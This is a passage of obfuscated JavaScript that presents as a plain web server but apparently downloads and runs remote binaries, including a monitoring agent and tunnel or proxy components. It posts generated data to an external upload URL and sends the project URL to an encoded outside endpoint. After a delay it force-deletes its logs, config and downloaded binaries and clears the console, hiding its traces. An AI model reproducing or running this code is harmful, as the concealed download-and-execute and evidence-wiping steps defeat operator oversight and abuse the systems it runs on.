axios[_0x5e5b66(0x1dc)](UPLOAD_URL+_0x5e5b66(0x245),_0x582b6a,{'headers':{'Content-Type':'application/json'}});return _0x37e149&&_0x37e149[_0x5e5b66(0x209)]===0xc8?(console[_0x5e5b66(0x1f9)](_0x5e5b66(0x227)),_0x37e149):null;}catch(_0xc911c6){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0xda98b9=_0x51d5,_0x2d979b=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2d979b[_0xda98b9(0x214)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2d979b[_0xda98b9(0x214)](phpPath);process['platform']===_0xda98b9(0x24d)?exec('del\x20/f\x20/q\x20'+_0x2d979b[_0xda98b9(0x1c3)]('\x20')+_0xda98b9(0x1fb),_0x3d6e01=>{const _0xae66cc=_0xda98b9;console[_0xae66cc(0x1f5)](),console[_0xae66cc(0x1f9)](_0xae66cc(0x220)),console['log'](_0xae66cc(0x24e));}):exec(_0xda98b9(0x217)+_0x2d979b[_0xda98b9(0x1c3)]('\x20')+_0xda98b9(0x232),_0x10f7cb=>{const _0x1ca3bc=_0xda98b9;console[_0x1ca3bc(0x1f5)](),console[_0x1ca3bc(0x1f9)](_0x1ca3bc(0x220)),console[_0x1ca3bc(0x1f9)](_0x1ca3bc(0x24e));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x34581d=_0x4c4a52;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x34581d(0x1f9)](_0x34581d(0x1e6));return;}try{const _0x57cc21=await axios[_0x34581d(0x1dc)](_0x34581d(0x1d4),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x34581d(0x1fa)}});return console[_0x34581d(0x1f9)](_0x34581d(0x23b)),_0x57cc21;}catch(_0x5343e2){return console['error'](_0x34581d(0x208)+_0x5343e2[_0x34581d(0x1d7)]),null;}}async function startserver(){const _0x1763b2=_0x4c4a52;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3c70d7){console[_0x1763b2(0x23c)](_0x1763b2(0x1fe),_0x3c70d7);}}startserver()['catch'](_0x4dbf12=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x4dbf12);}),app[_0x4c4a52(0x219)](PORT,()=>console[_0x4c4a52(0x1f9)](_0x4c4a52(0x22d)+PORT+'!'));
